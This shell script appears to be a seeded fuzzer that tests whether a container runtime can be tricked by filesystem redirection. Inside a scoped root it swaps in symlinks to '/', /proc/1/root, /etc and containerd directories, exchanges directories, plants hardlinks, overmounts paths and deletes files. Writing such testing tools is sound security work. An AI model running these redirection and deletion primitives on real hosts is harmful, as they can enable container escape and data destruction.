#!/bin/sh
# SPDX-License-Identifier: GPL-2.0
#
# Generalized redirection fuzzer.
#
# This replaces the CVE-preset table with a *seeded, compositional mutator* over
# the filesystem/namespace vocabulary. It does not replay named CVEs; it samples
# a plan and leaves a final state, and the harness-owned oracle decides whether
# the runtime's use was fooled. The CVE corpus survives only as a `known=` tag
# on the plan record, so a finding can be classified old vs new -- never as a
# menu the attacker chooses from.
#
# Contract (unchanged): argv[1] == CRFUZZ_TARGET_PATH, {path} substituted by the
# engine; env CRFUZZ_CHECKPOINT, CRFUZZ_ATTACK_ROOT (scope). The victim is
# frozen for the whole turn, so only the *final* state matters; atomicity is not
# a winning concern and any number of steps may be used.
#
# Inputs:
#   CRFUZZ_ATTACK_SEED          seed string; same seed -> same plan (default:
#                               time+pid, still logged so any run is replayable)
#   CRFUZZ_ATTACK_MAX_STEPS     reserved for multi-step plans (default 3)
#   CRFUZZ_ATTACK_ALLOW_MOUNT   1 to permit bind/tmpfs overmount (CAP_SYS_ADMIN)
#   CRFUZZ_ATTACK_EXCLUDE_KNOWN 1 to resample plans that match a known transcript
#   CRFUZZ_EVIL_DIR|EVIL_FILE|EVIL_TARGET   payloads
#   CRFUZZ_PATH_FROM/TO         optional namespace -> host view remap
#   CRFUZZ_ATTACK_LOG           action log (default /tmp/crfuzz-attack.log)
#   CRFUZZ_ATTACK_PLAN_LOG      machine-readable plan record
#
# Plan record (tab-separated):
#   seed  checkpoint  status  target  target-kind  recipe  payload  result  known
set -u

LOG="${CRFUZZ_ATTACK_LOG:-/tmp/crfuzz-attack.log}"
PLANLOG="${CRFUZZ_ATTACK_PLAN_LOG:-/tmp/crfuzz-plan.log}"
TARGET="${CRFUZZ_TARGET_PATH:-${1:-}}"
CKPT="${CRFUZZ_CHECKPOINT:-unknown}"
ROOT="${CRFUZZ_ATTACK_ROOT:-}"; ROOT="${ROOT%/}"

EVIL_DIR="${CRFUZZ_EVIL_DIR:-/tmp/crfuzz-evil-dir}"
EVIL_FILE="${CRFUZZ_EVIL_FILE:-/tmp/crfuzz-evil-file}"
EVIL_TARGET="${CRFUZZ_EVIL_TARGET:-/tmp/crfuzz-evil-target}"
ALLOW_MOUNT="${CRFUZZ_ATTACK_ALLOW_MOUNT:-0}"
EXCLUDE_KNOWN="${CRFUZZ_ATTACK_EXCLUDE_KNOWN:-0}"

# --- deterministic PRNG -----------------------------------------------------
# LCG over 2^31; R is global and pick()/roll() mutate it in place (no command
# substitution, which would run in a subshell and drop the state).
SEED_STR="${CRFUZZ_ATTACK_SEED:-}"
[ -n "$SEED_STR" ] || SEED_STR="$(date +%s 2>/dev/null)-$$"
SEED=$(printf '%s|%s|%s' "$SEED_STR" "$CKPT" "$TARGET" | cksum | awk '{print $1}')
R="$SEED"
rnd()  { R=$(( (1103515245 * R + 12345) % 2147483648 )); RV=$(( (R / 32768) % 32768 )); }
roll() { rnd; RV=$(( RV % $1 )); }
pick() { n=$#; [ "$n" -gt 0 ] || { PICKED=""; return 0; }; roll "$n"; shift "$RV"; PICKED="$1"; }

log()     { printf '%s\t%s\t%s\t%s\n' "$CKPT" "${1:-}" "${2:-}" "${3:-}" >>"$LOG"; }
planlog() { printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
              "$SEED" "$CKPT" "${1:-}" "${2:-}" "${3:-}" "${4:-}" "${5:-}" "${6:-}" "${7:-}" >>"$PLANLOG"; }
no() { log sample "${TARGET:--}" "unreachable $1"; planlog skip "$TARGET" "${K:-?}" "-" "-" "-" "-" "$1"; exit 0; }

kind_of() {
    if   [ -L "$1" ]; then printf symlink
    elif [ -d "$1" ]; then printf dir
    elif [ -e "$1" ]; then printf file
    else                   printf none
    fi
}
# A path whose device differs from its parent's is a mount root; rename(2) on it
# is EBUSY, so exchange/recreate/hardlink are structurally impossible there.
is_mp() { [ -n "${1:-}" ] && [ "$(stat -c %d -- "$1" 2>/dev/null)" != "$(stat -c %d -- "$(dirname -- "$1")" 2>/dev/null)" ]; }

# --- reachability -----------------------------------------------------------
[ -n "$TARGET" ] || no no-path
if [ -n "${CRFUZZ_PATH_FROM:-}" ]; then
    case "$TARGET" in
        "$CRFUZZ_PATH_FROM"*) TARGET="${CRFUZZ_PATH_TO:-}${TARGET#"$CRFUZZ_PATH_FROM"}" ;;
    esac
fi
[ -n "$ROOT" ] || no no-root
[ "$TARGET" = "$ROOT" ] && no root-itself
case "$TARGET" in "$ROOT"/*) ;; *) no outside-root ;; esac
K="$(kind_of "$TARGET")"
[ "$K" = none ] && no no-target

[ -d "$EVIL_DIR" ]  || mkdir -p -- "$EVIL_DIR" 2>/dev/null
[ -e "$EVIL_FILE" ] || printf 'CRFUZZ-EVIL\n' >"$EVIL_FILE" 2>/dev/null

# --- target selection: leaf, or a random in-scope ancestor ------------------
P="$TARGET"
select_target() {
    P="$TARGET"
    roll 100
    [ "$RV" -lt 40 ] || return 0
    cur=$(dirname -- "$TARGET")
    set -- ''
    while :; do
        [ "$cur" = "$ROOT" ] && break
        case "$cur" in "$ROOT"/*) ;; *) break ;; esac
        [ -d "$cur" ] && set -- "$@" "$cur"
        parent=$(dirname -- "$cur"); [ "$parent" = "$cur" ] && break; cur="$parent"
    done
    shift   # drop the '' sentinel
    [ "$#" -gt 0 ] && { pick "$@"; P="$PICKED"; }
}
select_target
PK="$(kind_of "$P")"
[ "$PK" = none ] && { log sample "$P" "target-vanished"; planlog skip "$P" "$PK" "-" "-" "-" "-" "vanished"; exit 0; }
PDIR=$(dirname -- "$P")

# --- payloads ---------------------------------------------------------------
LINKTO=""
choose_linkto() {
    # Bias to host-internal anchors: the interesting redirections are onto the
    # runtime's own view, not onto an inert file.
    roll 100
    if [ "$RV" -lt 45 ]; then LINKTO="/"; return 0; fi
    pick "/proc/self/root" "/proc/1/root" "/proc/self/cwd" "/etc" "/root" \
         "/var/lib/containerd" "/run/containerd" "$EVIL_TARGET" ".." "." "$(dirname -- "$P")"
    LINKTO="$PICKED"
}
choose_child() {
    CHILD=""
    [ -d "$P" ] || return 1
    set -- $(find "$P" -mindepth 1 -maxdepth 1 2>/dev/null | head -n 400)
    [ "$#" -gt 0 ] || return 1
    pick "$@"; CHILD="$PICKED"
}

# --- primitives -------------------------------------------------------------
plant_scratch() { # $1=type $2=linkto ; sets SCRATCH
    SCRATCH="$PDIR/.crfuzz-fz.$$"
    rm -rf -- "$SCRATCH" 2>/dev/null
    case "$1" in
        dir)     mkdir -- "$SCRATCH" 2>/dev/null || return 1
                 [ -d "$EVIL_DIR" ] && cp -a -- "$EVIL_DIR/." "$SCRATCH/" 2>/dev/null ;;
        file)    cp -- "$EVIL_FILE" "$SCRATCH" 2>/dev/null || return 1 ;;
        symlink) ln -s -- "${2:-$LINKTO}" "$SCRATCH" 2>/dev/null || return 1 ;;
        fifo)    mkfifo -- "$SCRATCH" 2>/dev/null || return 1 ;;
        dev)     mknod -- "$SCRATCH" c 1 3 2>/dev/null || return 1 ;;
        *)       return 1 ;;
    esac
    return 0
}
exchange_at() { # $1=path $2=type $3=linkto
    p="$1"; d=$(dirname -- "$p")
    plant_scratch "$2" "$3" || return 1
    bak="$d/.crfuzz-fz-bak.$$"
    rm -rf -- "$bak" 2>/dev/null
    mv -f -- "$p" "$bak" 2>/dev/null || { rm -rf -- "$SCRATCH"; return 1; }
    if mv -f -- "$SCRATCH" "$p" 2>/dev/null; then rm -rf -- "$bak" 2>/dev/null; return 0; fi
    mv -f -- "$bak" "$p" 2>/dev/null
    return 1
}

r_symlink()  { p="$1"; rm -rf -- "$p" 2>/dev/null; ln -s -- "$LINKTO" "$p" 2>/dev/null || return 1; RESULT="symlink $p -> $LINKTO"; }
r_exchange() { p="$1"; exchange_at "$p" "$SUB" "$LINKTO" || return 1; RESULT="exchange $p as $SUB -> ${LINKTO:-:}"; }
r_recreate() {
    p="$1"
    case "$SUB" in
        dir)     return 1 ;;
        symlink) rm -rf -- "$p" 2>/dev/null; ln -s -- "$LINKTO" "$p" 2>/dev/null || return 1 ;;
        fifo)    rm -rf -- "$p" 2>/dev/null; mkfifo -- "$p" 2>/dev/null || return 1 ;;
        dev)     rm -rf -- "$p" 2>/dev/null; mknod -- "$p" c 1 3 2>/dev/null || return 1 ;;
        file)    rm -rf -- "$p" 2>/dev/null; cp -- "$EVIL_FILE" "$p" 2>/dev/null || return 1 ;;
    esac
    RESULT="recreate $p as $SUB"
}
r_hardlink() { p="$1"; [ -d "$p" ] && return 1; is_mp "$p" && return 1; rm -f -- "$p" 2>/dev/null; ln -- "$EVIL_FILE" "$p" 2>/dev/null || return 1; RESULT="hardlink $p <- $EVIL_FILE"; }
r_tree()     { p="$1"; [ -d "$p" ] && ! is_mp "$p" || return 1; exchange_at "$p" dir "" || return 1; RESULT="tree $p overlay $EVIL_DIR"; }
r_overmount() {
    p="$1"; [ "$ALLOW_MOUNT" = 1 ] || return 1; [ -d "$p" ] || return 1
    case "$OSUB" in
        tmpfs) mount -t tmpfs -o size=16m,nodev,nosuid tmpfs "$p" 2>/dev/null || return 1; RESULT="tmpfs $p" ;;
        *)     mount --bind -- "$EVIL_DIR" "$p" 2>/dev/null || return 1; RESULT="bind $p <- $EVIL_DIR" ;;
    esac
}
r_meta() {
    p="$1"
    case "$MSUB" in
        chmod) chmod 0000 "$p" 2>/dev/null || return 1; RESULT="chmod 0000 $p" ;;
        chown) chown 12345:12345 "$p" 2>/dev/null || return 1; RESULT="chown 12345:12345 $p" ;;
        xattr) setfattr -n user.crfuzz -v evil "$p" 2>/dev/null || return 1; RESULT="xattr user.crfuzz=evil $p" ;;
        *)     return 1 ;;
    esac
}
r_chain() {
    p="$1"; d=$(dirname -- "$p"); a="$d/.crfuzz-fz-a.$$"
    rm -rf -- "$a" "$p" 2>/dev/null
    ln -s -- "$LINKTO" "$a" 2>/dev/null || return 1
    ln -s -- "$a" "$p" 2>/dev/null || return 1
    RESULT="chain $p -> $a -> $LINKTO"
}
r_compose() {
    p="$1"; choose_child_for "$p" || return 1; c="$CHILD"
    pp="$P"; P="$c"
    pick symlink exchange recreate hardlink
    case "$PICKED" in
        symlink)  r_symlink  "$c" && CREs="$RESULT" ;;
        exchange) r_exchange "$c" && CREs="$RESULT" ;;
        recreate) r_recreate "$c" && CREs="$RESULT" ;;
        hardlink) r_hardlink "$c" && CREs="$RESULT" ;;
    esac
    P="$pp"
    [ -n "${CREs:-}" ] || return 1
    # then redirect the parent: symlink or exchange
    pick symlink exchange
    if [ "$PICKED" = symlink ]; then r_symlink "$p" || return 1; else r_exchange "$p" || return 1; fi
    RESULT="compose [$CREs] then $RESULT"
    CREs=""
}
# choose_child() reads global P; compose needs it on an explicit path.
choose_child_for() { P="$1"; choose_child; }

# --- plan selection ---------------------------------------------------------
pick symlink exchange recreate hardlink tree overmount meta chain compose
RECIPE="$PICKED"
pick dir file symlink fifo dev
SUB="$PICKED"
roll 100; [ "$RV" -lt 35 ] && SUB="$PK"     # mirror bias: keep the observed type
choose_linkto
pick chmod chown xattr;  MSUB="$PICKED"
pick bind tmpfs;         OSUB="$PICKED"

# known-transcript tag (not exclusion unless asked): the plans the CVE corpus
# already covers. A finding with known=0 is the interesting kind.
KNOWN=0
case "$RECIPE:$SUB" in
    exchange:dir)    [ "$PK" = dir ] && KNOWN=1 ;;
    exchange:symlink) KNOWN=1 ;;
    tree:*)          KNOWN=1 ;;
    recreate:symlink) KNOWN=1 ;;
esac
[ "$RECIPE" = symlink ] && KNOWN=1
i=0
while [ "$EXCLUDE_KNOWN" = 1 ] && [ "$KNOWN" = 1 ] && [ "$i" -lt 6 ]; do
    pick symlink exchange recreate hardlink tree overmount meta chain compose
    RECIPE="$PICKED"
    pick dir file symlink fifo dev; SUB="$PICKED"
    roll 100; [ "$RV" -lt 35 ] && SUB="$PK"
    KNOWN=0
    case "$RECIPE:$SUB" in
        exchange:dir)    [ "$PK" = dir ] && KNOWN=1 ;;
        exchange:symlink) KNOWN=1 ;;
        tree:*)          KNOWN=1 ;;
        recreate:symlink) KNOWN=1 ;;
    esac
    [ "$RECIPE" = symlink ] && KNOWN=1
    i=$((i+1))
done

# --- execute ----------------------------------------------------------------
case "$RECIPE" in
    symlink)   r_symlink   "$P" ;;
    exchange)  r_exchange  "$P" ;;
    recreate)  r_recreate  "$P" ;;
    hardlink)  r_hardlink  "$P" ;;
    tree)      r_tree      "$P" ;;
    overmount) r_overmount "$P" ;;
    meta)      r_meta      "$P" ;;
    chain)     r_chain     "$P" ;;
    compose)   r_compose   "$P" ;;
    *)         exit 0 ;;
esac
rc=$?
PAY="$SUB${LINKTO:+|$LINKTO}"
if [ "$rc" -eq 0 ]; then
    log "$RECIPE" "$P" "$RESULT"
    planlog hit "$P" "$PK" "$RECIPE" "$PAY" "$RESULT" "known=$KNOWN"
else
    log "$RECIPE" "$P" "failed kind=$PK${LINKTO:+ link=$LINKTO}"
    planlog fail "$P" "$PK" "$RECIPE" "$PAY" "-" "known=$KNOWN"
fi
exit 0
